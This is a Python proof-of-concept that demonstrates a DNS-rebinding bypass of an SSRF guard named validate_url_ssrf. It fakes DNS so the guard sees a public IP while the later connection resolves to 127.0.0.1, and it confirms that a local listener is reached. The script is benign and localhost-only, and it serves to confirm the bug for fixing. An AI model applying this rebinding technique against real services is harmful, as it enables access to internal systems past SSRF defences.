"""PoC: DNS-rebinding SSRF bypass of validate_url_ssrf (resolve-then-connect, no IP pin).
Faithful & benign: a raw local TCP sentinel stands in for an internal service; socket.getaddrinfo
flips public->private across successive lookups exactly as an attacker TTL=0 DNS does.
The guard validates the FIRST resolution (public -> passes) while the CONNECT re-resolves to the
sentinel (private) -> internal reach that the guard was supposed to block."""
import os, sys, socket, threading, time
sys.path.insert(0, os.path.join(os.getcwd(), "src"))
from core.utils import validate_url_ssrf, SSRFError

# 1) internal "service" sentinel: raw TCP listener on loopback
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
import errno
for _p in (8080, 8443):
    try:
        srv.bind(("127.0.0.1", _p)); break
    except OSError:
        continue
else:
    raise SystemExit("no allowed port free")
srv.listen(1)
PORT = srv.getsockname()[1]
hit = {"internal": False}
def accept_once():
    try:
        c,_ = srv.accept(); hit["internal"] = True; c.close()
    except OSError:
        pass
threading.Thread(target=accept_once, daemon=True).start()

HOST = "rebind.attacker.test"
PUBLIC = "93.184.216.34"   # example.com, public -> guard must ALLOW

# 2) attacker DNS: 1st lookup (the guard's) => public; later lookups (the connect's) => 127.0.0.1
_real = socket.getaddrinfo
calls = {"n": 0}
def flipping_getaddrinfo(host, port, *a, **k):
    if host == HOST:
        calls["n"] += 1
        ip = PUBLIC if calls["n"] == 1 else "127.0.0.1"
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, port or 0))]
    return _real(host, port, *a, **k)
socket.getaddrinfo = flipping_getaddrinfo

# 3) GUARD runs (resolves #1 = public) -> should PASS
try:
    validate_url_ssrf(f"http://{HOST}:{PORT}/")
    print(f"[guard] validate_url_ssrf ALLOWED http://{HOST}:{PORT}/  (saw public {PUBLIC} on resolution #1)")
except SSRFError as e:
    print("[guard] blocked (rebinding not effective):", e); sys.exit(0)

# 4) the actual outbound CONNECT re-resolves (#2 = 127.0.0.1) -> lands on the internal sentinel
try:
    s = socket.create_connection((HOST, PORT), timeout=3); s.close()
except OSError as e:
    print("[connect] error:", e)
time.sleep(0.2)
socket.getaddrinfo = _real
print(f"[connect] outbound request re-resolved {HOST} -> 127.0.0.1 and reached the INTERNAL sentinel: {hit['internal']}")
print("BUG CONFIRMED: guard passed but connection reached the private/internal IP (DNS rebinding, no IP pin)"
      if hit["internal"] else "NOT CONFIRMED")
srv.close()
